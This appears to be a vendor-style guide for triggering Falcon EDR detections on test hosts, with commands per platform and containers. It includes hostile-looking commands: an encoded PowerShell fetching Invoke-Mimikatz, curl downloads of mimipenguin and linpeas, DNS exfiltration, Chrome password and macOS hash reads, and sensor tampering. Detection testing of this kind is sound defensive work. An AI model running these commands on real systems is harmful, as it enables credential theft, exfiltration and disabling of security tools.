# Quick Detection Samples — Trigger Falcon Detections on Demand

Copy-paste commands that make a sensor-protected Windows, Linux, macOS, or container host raise a real Falcon detection. Use them to confirm a new sensor install is reporting, check that your prevention policies block what you expect, or see how a detection looks in the console.

> **Destructive:** Use these commands only on test hosts you own. They are intended to be harmless, but several download known attack tools, read credential stores, or touch the sensor's own files. Review each one before you run it. They are provided as is, without any guarantee, and you run them at your own risk.

> **Prerequisites:**
> - A host or cluster with the Falcon sensor installed and online (see **Tooling** > **Reference** > **Verification**)
> - A prevention policy assigned to the host. Samples marked **Blocked** or **Killed** only stop the action when the matching prevention toggle is on; otherwise they show up as detect-only.
> - Outbound internet access for the samples that download something (EICAR, mimipenguin, PEASS, detection container)

| Source | Link |
|--------|------|
| CrowdStrike detection container | https://github.com/CrowdStrike/detection-container |
| CrowdStrike VulnApp (browser front end) | https://github.com/CrowdStrike/vulnapp |
| EICAR test file | https://www.eicar.org/download-anti-malware-testfile/ |

## Where the detections show up

In the Falcon console, go to **Endpoint security** > **Monitor** > **Endpoint detections**. A new detection usually appears within a minute or two. Open it to see the process tree, the IOA name, and the MITRE tactic and technique.

> **Tip:** The **IOA name** (for example `ExecutionLin`) is the name of the behavior pattern that fired. It's the quickest way to confirm you triggered the sample you meant to, and it's also what you search on in Advanced Event Search.

### Sample detection matrix

<div data-detection-matrix="Sensor health,Credential theft,Ransomware,Exfiltration,Prevention,Containers,Web apps,Threat intel,Custom rules">

| Sample | Platforms | Severity | Result | Tactic | Use cases |
|--------|-----------|----------|--------|--------|-----------|
| [OverWatch test detections](#overwatch-test-detections) | Windows, Linux | All | Detect | OverWatch test | Sensor health, verify install, smoke test, new sensor, OverWatch, severity levels, first test, evaluation |
| [EICAR test file](#eicar-test-file) | Windows, Linux | Informational | Detect | Execution | Malware, antivirus, NGAV, AV replacement, file download, file write |
| [Falcon Intel indicator](#falcon-intel-indicator-domain) | Windows, Linux | High | Detect | Falcon Intel | Threat intel, IOC, malicious domain, DNS, adversary, intelligence |
| [Suspicious CLI command](#suspicious-cli-command) | Linux | High | Detect | Execution | Command line, shell, living off the land, Linux server |
| [Ingress tool transfer: mimipenguin](#ingress-tool-transfer-mimipenguin) | Linux | High | Detect | Command and Control | Tool download, curl, attacker tooling, Credential theft |
| [Ingress tool transfer: PEASS](#ingress-tool-transfer-peass) | Linux | High | Killed | Command and Control | Prevention, privilege escalation, linpeas, tool download, kill process |
| [DNS exfiltration](#dns-exfiltration) | Linux | High | Detect | Exfiltration | Exfiltration, data theft, DLP, DNS tunneling |
| [Automated collection](#automated-collection) | Linux | High | Detect | Collection | Account discovery, staging data, passwd, Linux server |
| [Ransomware file rename](#ransomware-file-rename) | Linux | High | Detect | Impact | Ransomware, LockBit, encryption, impact |
| [PowerShell exploit kit](#powershell-exploit-kit) | Windows | High | Blocked | Execution | Prevention, fileless, in-memory, mimikatz, encoded PowerShell, Credential theft |
| [Credential dumping: Chrome logins](#credential-dumping-chrome-logins) | Windows | Critical | Blocked | Credential Access | Credential theft, browser passwords, infostealer, Prevention, living off the land |
| [Sensor tamper attempt](#sensor-tamper-attempt) | Windows | High | Blocked | Defense Evasion | Tamper protection, anti-tamper, uninstall protection, Prevention |
| [Custom IOA rule](#custom-ioa-rule) | Windows | Your choice | Blocked | Custom IOA | Custom rules, application control, block an app, Prevention, policy |
| [ShadowHashData credential theft](#shadowhashdata-credential-theft) | macOS | High | Blocked | Credential Access | Credential theft, password hash, Mac, Prevention |
| [Container: rootkit](#container-rootkit) | Container | Critical | Detect | Defense Evasion | Containers, Kubernetes, rootkit, runtime protection, CWP |
| [Container: suspicious CLI command](#container-suspicious-cli-command) | Container | High | Detect | Execution | Containers, Kubernetes, command line, runtime protection |
| [Container: credential dumping](#container-credential-dumping) | Container | High | Detect | Credential Access | Containers, Kubernetes, Credential theft, mimipenguin |
| [Container: automated collection](#container-automated-collection) | Container | High | Detect | Collection | Containers, Kubernetes, account discovery, staging data |
| [Container: DNS exfiltration](#container-dns-exfiltration) | Container | High | Detect | Exfiltration | Containers, Kubernetes, Exfiltration, data theft, DNS tunneling |
| [Container: ransomware file rename](#container-ransomware-file-rename) | Container | High | Detect | Impact | Containers, Kubernetes, Ransomware, LockBit, encryption |
| [Container: drift](#container-drift) | Container | Medium | Detect | Container Drift | Containers, Kubernetes, drift, immutable containers, runtime protection |
| [Container: web shell terminal spawn](#container-web-shell-terminal-spawn) | Container | High | Detect | Persistence | Containers, Kubernetes, Web apps, web shell, command injection, PHP |
| [Container: unexpected child of web service](#container-unexpected-child-of-web-service) | Container | High | Detect | Execution | Containers, Kubernetes, Web apps, command injection, database dump |
| [Container: C2 via remote access tool](#container-c2-via-remote-access-tool) | Container | High | Killed | Command and Control | Containers, Kubernetes, Prevention, C2, reverse shell |
| [Container: reverse shell trojan](#container-reverse-shell-trojan) | Container | High | Killed | Machine Learning | Containers, Kubernetes, Prevention, machine learning, malware, reverse shell, trojan |

</div>

---

<details class="lab-section">
<summary>

## Any OS

</summary>

<details class="detection-card">
<summary>

### OverWatch test detections

</summary>

> **What & Why:** These fire CrowdStrike's built-in OverWatch test detections, one per severity. Any command line that contains the test string triggers one, so they are the safest way to show an OverWatch detection or prove a new sensor is reporting.

<div data-choice-picker="os"></div>

<div data-choice="os:windows">

Run each in Command Prompt:

```bat
cmd crowdstrike_test_critical
```

```bat
cmd crowdstrike_test_high
```

```bat
cmd crowdstrike_test_medium
```

```bat
cmd crowdstrike_test_low
```

```bat
cmd crowdstrike_test_informational
```

> **Look for:** One OverWatch detection per command, at the severity in its name, with process `cmd.exe`.

</div>

<div data-choice="os:linux">

Run each in a shell:

```bash
bash crowdstrike_test_critical
```

```bash
bash crowdstrike_test_high
```

```bash
bash crowdstrike_test_medium
```

```bash
bash crowdstrike_test_low
```

```bash
bash crowdstrike_test_informational
```

> **Note:** `bash` prints `No such file or directory`. That's expected: the sensor matches the command line, not a real file.

> **Look for:** One OverWatch detection per command, at the severity in its name, with process `bash`.

</div>

</details>

<details class="detection-card">
<summary>

### EICAR test file

</summary>

> **What & Why:** EICAR is the industry-standard harmless "virus" string that every AV engine flags. Downloading it shows file-write detection without real malware.

<div data-choice-picker="os"></div>

<div data-choice="os:linux">

<div data-choice-picker="distro"></div>

</div>

<div data-choice="os:windows">

Download the test file in PowerShell:

```powershell
Invoke-WebRequest "https://secure.eicar.org/eicar.com" -OutFile "eicar.com"
```

> **Look for:** Severity **Informational**, IOA name `EICARTestFileWrittenWin`, tactic **Execution via User Execution** (T1204).

</div>

<div data-choice="os:linux">

Install dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get update && sudo apt-get install -y wget
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf install -y wget
```

</div>

Download the test file:

```bash
wget https://secure.eicar.org/eicar.com
```

> **Look for:** Severity **Informational**, tactic **Execution via User Execution** (T1204).

</div>

> **Heads-up:** A corporate proxy (for example Zscaler) may block the download before it reaches the host. If no file lands, try from a host with direct internet access, or download it from the EICAR site in a browser.

<div data-choice="os:windows">

Clean up:

```powershell
Remove-Item eicar.com -ErrorAction SilentlyContinue
```

</div>

<div data-choice="os:linux">

Clean up:

```bash
rm -f eicar.com
```

Remove dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get remove -y wget
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf remove -y wget
```

</div>

</div>

</details>

<details class="detection-card">
<summary>

### Falcon Intel indicator (domain)

</summary>

> **What & Why:** Resolving a domain that CrowdStrike Intelligence has tied to targeted attacks fires an intel-driven detection with no malicious payload at all.

<div data-choice-picker="os"></div>

<div data-choice="os:linux">

<div data-choice-picker="distro"></div>

</div>

<div data-choice="os:windows">

```bat
nslookup checkmarx.zone
```

</div>

<div data-choice="os:linux">

Install dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get update && sudo apt-get install -y dnsutils
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf install -y bind-utils
```

</div>

Resolve the domain:

```bash
nslookup checkmarx.zone
```

</div>

> **Look for:** Severity **High**, IOA name `IntelDomainHigh`, tactic **Falcon Intel via Intelligence Indicator - Domain** (CST0018).

<div data-choice="os:linux">

Remove dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get remove -y dnsutils
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf remove -y bind-utils
```

</div>

</div>

</details>

</details>

<details class="lab-section">
<summary>

## Linux

</summary>

<details class="detection-card">
<summary>

### Suspicious CLI command

</summary>

> **What & Why:** A shell invocation wrapped in `[S]` / `[E]` markers is a common pattern in attacker command output parsing.

```bash
sh -c whoami '[S];pwd;echo [E]'
```

> **Look for:** Severity **High**, IOA name `ExecutionLin`, tactic **Execution via Command and Scripting Interpreter** (T1059).

</details>

<details class="detection-card">
<summary>

### Ingress tool transfer: mimipenguin

</summary>

> **What & Why:** Pulling a known Linux credential dumper with `curl` triggers the ingress-tool-transfer IOA. The script prints to the terminal and is never run.

<div data-choice-picker="distro"></div>

Install dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get update && sudo apt-get install -y curl
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf install -y curl
```

</div>

Download the script:

```bash
curl -L https://raw.githubusercontent.com/huntergregal/mimipenguin/refs/heads/master/mimipenguin.py
```

> **Look for:** Tactic **Command and Control via Ingress Tool Transfer**, with the `curl` command line as the triggering indicator.

Remove dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get remove -y curl
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf remove -y curl
```

</div>

</details>

<details class="detection-card">
<summary>

### Ingress tool transfer: PEASS

</summary>

> **What & Why:** Same tactic, but downloading the PEASS privilege-escalation toolkit under a disguised name (`ccleaner.sh`) is a high-confidence pattern, so prevention kills the process.

<div data-choice-picker="distro"></div>

Install dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get update && sudo apt-get install -y curl
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf install -y curl
```

</div>

Download the toolkit:

```bash
curl https://github.com/carlospolop/PEASS-ng/releases/linpeas.sh -o ccleaner.sh
```

> **Look for:** Severity **High**, action **Process killed**, IOA name `CurlWgetMalwareDownload`, tactic **Command and Control via Ingress Tool Transfer** (T1105).

Clean up:

```bash
rm -f ccleaner.sh
```

Remove dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get remove -y curl
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf remove -y curl
```

</div>

</details>

<details class="detection-card">
<summary>

### DNS exfiltration

</summary>

> **What & Why:** Encoding data into DNS lookups is a classic way to sneak it past firewalls. This hex-encodes 2 KB of random data and sends it as subdomains of a decoy hostname, about 65 lookups. No real data leaves the host.

<div data-choice-picker="distro"></div>

Install dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get update && sudo apt-get install -y xxd dnsutils
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf install -y vim-common bind-utils
```

</div>

Send the data over DNS:

```bash
head -c 2000 /dev/urandom | xxd -p -c31 | while read a; do dig $a.legith4x0r.elb.amazonaws.com > /dev/null; done
```

> **Look for:** Severity **High**, IOA name `ExfilViaDNSRequest`, tactic **Exfiltration via Exfiltration Over Alternative Protocol** (T1048).

Remove dependencies:

<div data-choice="distro:debian">

```bash
sudo apt-get remove -y xxd dnsutils
```

</div>

<div data-choice="distro:rhel,amazon">

```bash
sudo dnf remove -y bind-utils
```

</div>

</details>

<details class="detection-card">
<summary>

### Automated collection

</summary>

> **What & Why:** Copying the root accounts out of `/etc/passwd` into `/tmp` looks like an attacker staging account data for exfiltration.

```bash
sh -c "/bin/grep 'x:0:' /etc/passwd > /tmp/passwords"
```

> **Look for:** Severity **High**, tactic **Collection via Automated Collection**.

Clean up:

```bash
rm -f /tmp/passwords
```

</details>

<details class="detection-card">
<summary>

### Ransomware file rename

</summary>

> **What & Why:** Renaming a file with the `.lockbit` extension mimics LockBit ransomware encrypting files. Only a throwaway file in `/tmp` is touched.

```bash
mkdir -p /tmp/cs-test && echo "fake data" > /tmp/cs-test/fakedata.txt && mv /tmp/cs-test/fakedata.txt /tmp/cs-test/fakedata.txt.lockbit
```

> **Look for:** Severity **High**, tactic **Impact via Data Encrypted for Impact**.

Clean up:

```bash
rm -rf /tmp/cs-test
```

</details>

</details>

<details class="lab-section">
<summary>

## Windows

</summary>

<details class="detection-card">
<summary>

### PowerShell exploit kit

</summary>

> **What & Why:** A hidden, policy-bypassing PowerShell that downloads and runs `Invoke-Mimikatz` in memory is a textbook fileless attack. The Base64 payload decodes to `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz`.

```bat
powershell -windowStyle Hidden -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA==
```

> **Look for:** Severity **High**, action **Operation blocked**, IOA name `PShellExploitKit2`, tactic **Execution via PowerShell** (T1059.001). Toggle **Show decoded** in the detection to see the decoded script.

</details>

<details class="detection-card">
<summary>

### Credential dumping: Chrome logins

</summary>

> **What & Why:** Using the built-in `esentutl.exe` to copy Chrome's saved-password database is a known credential-theft technique that avoids dropping a custom tool.

Install Chrome, then open and close it once so its `Login Data` file exists:

```bat
winget install -e --id Google.Chrome
```

Run the copy:

```bat
cmd.exe /Q /c esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data.tmp"
```

> **Look for:** Severity **Critical**, action **Process blocked**, IOA name `CredDump`, tactic **Credential Access via OS Credential Dumping** (T1003).

Clean up:

```bat
del "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data.tmp"
```

Uninstall Chrome:

```bat
winget uninstall -e --id Google.Chrome
```

</details>

<details class="detection-card">
<summary>

### Sensor tamper attempt

</summary>

> **What & Why:** Trying to delete the Falcon driver folder shows the sensor protecting itself from tampering.

> **Warning:** Run from an elevated (Administrator) Command Prompt, and make sure the host's sensor update policy has **Uninstall and maintenance protection** turned on before you test. Without it, you are relying on the sensor's file-system protection alone.

```bat
rmdir %SystemRoot%\system32\drivers\CrowdStrike
```

> **Look for:** Severity **High**, action **File system operation blocked**, IOA name `FileSystemTamperFalcon...`, tactic **Defense Evasion via Disable or Modify Tools** (T1562.001). `rmdir` returns `Access is denied`.

</details>

<details class="detection-card">
<summary>

### Custom IOA rule

</summary>

> **What & Why:** Shows that you can write your own behavioral rules. The rule blocks `calc.exe` when it is launched from anything other than Explorer, so a command-line launch is blocked but the Start menu still works. That shows the rule is checking the parent process, not just the file name.

1. In the Falcon console, go to **Endpoint security** > **Configure** > **Custom IOA rule groups** and click **Create rule group**. Platform: **Windows**.
2. In the group, click **Add new rule**:
   - Rule type: **Process Creation**
   - Action to take: **Block Execution**
   - Severity: **Informational** (or any level)
   - Image FileName: `.+\\calc\.exe`
   - Parent Image FileName, **Exclude**: `.+\\explorer\.exe`
3. Enable the rule and the rule group, then open the host's prevention policy and assign the rule group under **Custom IOA rule groups**.
4. Wait a few minutes for the policy to reach the host, then run:

```bat
calc.exe
```

> **Look for:** Calculator does not open from the Command Prompt but does open from the Start menu. A detection with your rule name appears at the severity you picked.

Clean up: in **Custom IOA rule groups**, open your rule group, click **Disable**, and then **Delete** it. Otherwise it keeps blocking `calc.exe` on every host in that prevention policy.

</details>

</details>

<details class="lab-section">
<summary>

## macOS

</summary>

<details class="detection-card">
<summary>

### ShadowHashData credential theft

</summary>

> **What & Why:** macOS stores each local user's password hash in the `ShadowHashData` attribute. Reading it with `dscl` is the first step of an offline password-cracking attack.

```bash
sudo dscl . read /Users/$(whoami) dsAttrTypeNative:ShadowHashData
```

> **Look for:** A Credential Access via OS Credential Dumping detection. If **Credential Dumping** is turned on in the Mac prevention policy, the command is blocked.

> **Warning:** If it isn't blocked, the command prints your password hash. Don't run it while screen-sharing.

</details>

</details>

<details class="lab-section">
<summary>

## Containers and Kubernetes

</summary>

The [CrowdStrike detection container](https://github.com/CrowdStrike/detection-container) is an official image that bundles attack scripts. Run one script per container, on any Linux Docker host with the Falcon sensor. Each container starts, runs the script, and exits.

> **Tip:** On Kubernetes (DaemonSet sensor or Container Sensor), run the same script as a one-off pod. Replace `<SCRIPT>` with the script name from any block below:
>
> `kubectl run detection-test --rm -i --restart=Never --image=quay.io/crowdstrike/detection-container -- "bash /home/eval/bin/<SCRIPT>"`
>
> The pod is deleted when the script finishes. Prefer clicking? [VulnApp](https://github.com/CrowdStrike/vulnapp) wraps the same scripts in a web page with one button per detection.

<div data-choice-picker="distro"></div>

Install Docker:

<div data-choice="distro:debian,rhel">

```bash
curl -fsSL https://get.docker.com | sudo sh
```

</div>

<div data-choice="distro:amazon">

```bash
sudo dnf install -y docker
```

</div>

Start Docker:

```bash
sudo systemctl enable --now docker
```

<details class="detection-card">
<summary>

### Container: rootkit

</summary>

> **What & Why:** Changes the group owner of `/etc/ld.so.preload`, the file a Jynx-style rootkit uses to inject itself into every process.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Defense_Evasion_via_Rootkit.sh"
```

> **Look for:** Severity **Critical**, tactic **Defense Evasion via Rootkit**.

</details>

<details class="detection-card">
<summary>

### Container: suspicious CLI command

</summary>

> **What & Why:** The same `[S]`/`[E]` shell pattern as the Linux sample, but inside a container, so the detection carries container and image details.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Execution_via_Command-Line_Interface.sh"
```

> **Look for:** Severity **High**, tactic **Execution via Command and Scripting Interpreter**.

</details>

<details class="detection-card">
<summary>

### Container: credential dumping

</summary>

> **What & Why:** Runs mimipenguin inside the container to try to pull cleartext passwords from memory.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Credential_Access_via_Credential_Dumping.sh"
```

> **Look for:** Severity **High**, tactic **Credential Access via OS Credential Dumping**.

</details>

<details class="detection-card">
<summary>

### Container: automated collection

</summary>

> **What & Why:** Copies the root accounts out of `/etc/passwd` into `/tmp`.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Collection_via_Automated_Collection.sh"
```

> **Look for:** Severity **High**, tactic **Collection via Automated Collection**.

</details>

<details class="detection-card">
<summary>

### Container: DNS exfiltration

</summary>

> **What & Why:** Zips a few files and sends them hex-encoded as DNS lookups.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Exfiltration_via_Exfiltration_Over_Alternative_Protocol.sh"
```

> **Look for:** Severity **High**, tactic **Exfiltration via Exfiltration Over Alternative Protocol**.

</details>

<details class="detection-card">
<summary>

### Container: ransomware file rename

</summary>

> **What & Why:** Renames a throwaway file with the `.lockbit` extension, then cleans up.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Impact_via_Data_Encrypted_for_Impact.sh"
```

> **Look for:** Severity **High**, tactic **Impact via Data Encrypted for Impact**.

</details>

<details class="detection-card">
<summary>

### Container: drift

</summary>

> **What & Why:** Copies a binary to a new name and runs it. Running a file that wasn't in the original image is "drift", a strong container-compromise signal.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/ContainerDrift_Via_File_Creation_and_Execution.sh"
```

> **Look for:** Severity **Medium**, a Container Drift detection.

</details>

<details class="detection-card">
<summary>

### Container: web shell terminal spawn

</summary>

> **What & Why:** Uses command injection against the container's built-in vulnerable web page to write a PHP web shell, then calls it.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Webserver_Suspicious_Terminal_Spawn.sh"
```

> **Look for:** Severity **High**, with the web server (`httpd` or `php-fpm`) as the parent of the shell.

</details>

<details class="detection-card">
<summary>

### Container: unexpected child of web service

</summary>

> **What & Why:** Command injection makes the web server run `mysqldump`, a process a web server should never start.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Webserver_Unexpected_Child_of_Web_Service.sh"
```

> **Look for:** Severity **High**, an unexpected-child-of-web-service detection.

</details>

<details class="detection-card">
<summary>

### Container: C2 via remote access tool

</summary>

> **What & Why:** A Ruby one-liner tries to open a remote-control connection to a private IP and forks into the background.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Command_Control_via_Remote_Access.sh"
```

> **Look for:** Severity **High**. With prevention on, the process is **killed**.

</details>

<details class="detection-card">
<summary>

### Container: reverse shell trojan

</summary>

> **What & Why:** Runs an inert trojan written by CrowdStrike that tries to call back to a private IP.

```bash
sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Reverse_Shell_Trojan.sh"
```

> **Look for:** Severity **High**, killed by on-sensor machine learning.

> **Note:** This one only fires when the prevention policy has machine learning set to **Aggressive** or higher.

</details>

Clean up:

```bash
sudo docker rmi quay.io/crowdstrike/detection-container
```

On Kubernetes, the `kubectl run --rm` pod deletes itself. Confirm nothing is left behind:

```bash
kubectl get pods detection-test
```

> **Verify:** `Error from server (NotFound)` means the pod is gone.

Uninstall Docker:

<div data-choice="distro:debian">

```bash
sudo apt-get purge -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

</div>

<div data-choice="distro:rhel">

```bash
sudo dnf remove -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

</div>

<div data-choice="distro:amazon">

```bash
sudo dnf remove -y docker
```

</div>

</details>

## Going further

- **Atomic Red Team:** For broader MITRE coverage on Linux and macOS, [Invoke-AtomicRedTeam](https://github.com/redcanaryco/invoke-atomicredteam) runs hundreds of scripted tests. It needs PowerShell (`pwsh`) and the atomics folder installed first, so it isn't a one-liner. Some tests change the host (hidden users, history clearing), so use a throwaway VM and run `-Cleanup` afterwards.
